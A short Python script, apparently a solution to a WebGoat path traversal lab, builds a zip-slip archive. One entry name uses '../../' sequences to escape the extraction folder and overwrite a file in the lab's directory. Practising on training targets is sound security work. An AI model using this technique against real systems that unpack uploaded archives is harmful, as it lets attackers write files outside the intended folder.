import zipfile

with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.write('account.png', '../../home/webgoat/.webgoat-2025.3/PathTraversal/apkallus/apkallus.jpg') 
